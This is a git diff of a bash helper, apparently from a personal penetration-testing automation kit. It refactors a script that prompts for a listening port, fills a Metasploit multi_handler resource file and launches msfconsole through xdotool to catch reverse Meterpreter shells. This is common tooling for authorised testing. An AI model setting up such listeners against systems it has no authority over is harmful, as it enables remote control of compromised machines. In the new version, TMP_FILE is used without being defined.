@@ -1,27 +1,25 @@
 #!/bin/bash
 
-: '
-meterpreter: start reverse meterpreter windows x64 tcp rev shell
-'
+create_meterpreter_multi_handler() {
+    local PAYLOAD="${1}"
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
-source ~/Desktop/base/code/xdotool/helpers/find_and_replace_in_file.sh
+    # Generate GUI form items (label, type (optional: default text), name, default (optional))
+    LPORT_FIELD=$(form_item  "LPORT" "number" "LPORT" "1337")
 
-# Generate gui form
-generate_form "LPORT"
+    # Generate GUI form
+    generate_form "${LPORT_FIELD}"
 
-LPORT=${form_data["LPORT"]}
-PAYLOAD="${1}"
-FILES_FOLDER="$HOME/Desktop/base/code/xdotool/scripts/shell/msfconsole/.files"
+    FILES_FOLDER="${SCRIPTS_DIR}/shell/msfconsole/.files"
+    LPORT=${form_data["LPORT"]}
 
-SRC_FILE="${FILES_FOLDER}/multi_handler.rc"
-TMP_FILE="${FILES_FOLDER}/multi_handler_tmp.rc"
+    # Define replacement fields
+    REPLACE_FIELDS=(
+        "[LPORT]" "${LPORT}"
+        "[payload]" "${PAYLOAD}"
+    )
 
-replace_in_file "${SRC_FILE}" "${TMP_FILE}" "[LPORT]" "${LPORT}" "[payload]" "${PAYLOAD}"
+    find_and_replace_file "${FILES_FOLDER}" "multi_handler" "${REPLACE_FIELDS[@]}"
 
-paste_command "msfconsole -r ${TMP_FILE}"
-xdotool key Return
-
-sleep 30
-rm $TMP_FILE
+    paste_command "msfconsole -r ${TMP_FILE}"
+    xdotool key Return
+}
